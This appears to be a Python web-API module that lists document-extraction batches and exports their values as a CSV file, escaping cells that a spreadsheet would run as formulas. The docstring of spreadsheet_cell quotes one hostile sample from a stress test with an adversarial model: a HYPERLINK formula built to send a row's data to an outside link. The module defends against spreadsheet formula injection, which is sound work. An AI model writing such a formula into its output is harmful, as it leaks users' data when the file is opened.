"""Batch extraction records: the runs a batch made over a corpus and the numbers they add up to.
Batches are started from the command line (scripts/run_batch.py), never from the interface."""

from __future__ import annotations

import csv
import io

from fastapi import APIRouter, Depends
from fastapi.responses import PlainTextResponse
from sqlalchemy.orm import Session

from ..batch.service import list_batches, report
from ..db import get_session
from ..schemas import BatchOut, BatchSummary

router = APIRouter(prefix="/api/batches", tags=["batches"])


@router.get("", response_model=list[BatchSummary])
def batches(session: Session = Depends(get_session)) -> list[BatchSummary]:
    return list_batches(session)


@router.get("/{batch_id}", response_model=BatchOut)
def batch(batch_id: str, session: Session = Depends(get_session)) -> BatchOut:
    return report(session, batch_id)


# A cell whose first character, after any leading whitespace, makes a spreadsheet read it as a formula. A tab or a
# carriage return leads one by itself in some importers.
_FORMULA_LEADS = ("=", "+", "-", "@")


def spreadsheet_cell(text: str) -> str:
    """The cell as text a spreadsheet will not evaluate: one that would be read as a formula is written behind an
    apostrophe, which Excel shows. Every cell of the file goes through it, the header included: the model's conclusion,
    a contract's heading and a corpus file name are all text no one here chose, and a conclusion of
    '=HYPERLINK("https://...?leak="&A2&B2,"Open the clause")' opened in Excel as a live link that sent the row away
    (stress test, 2026-10-30, hostile-model 3). The text is never changed otherwise."""
    if text[:1] in ("\t", "\r") or text.lstrip("  \t\r\n")[:1] in _FORMULA_LEADS:
        return "'" + text
    return text


@router.get("/{batch_id}/values.csv", response_class=PlainTextResponse)
def batch_values_csv(batch_id: str, session: Session = Depends(get_session)) -> PlainTextResponse:
    """One row per document and field: the value, its status, the citation and how it was located, and the run. For
    spreadsheets: a cell that would be evaluated is escaped (spreadsheet_cell); GET /api/batches/{id} has the exact values."""
    out = report(session, batch_id)
    buffer = io.StringIO()
    writer = csv.writer(buffer, lineterminator="\n")
    writer.writerow(["document", "field", "outcome", "value", "status", "citation", "method", "run_id"])
    for row in out.rows:
        for field in out.fields:
            value = row.values[field.key]
            cells = [row.document_name, field.key, value.outcome, value.value or "", value.status or "", value.citation or "", value.method or "", value.run_id]
            writer.writerow([spreadsheet_cell(cell) for cell in cells])
    return PlainTextResponse(buffer.getvalue(), media_type="text/csv", headers={"Content-Disposition": f'attachment; filename="batch-{batch_id}-values.csv"'})
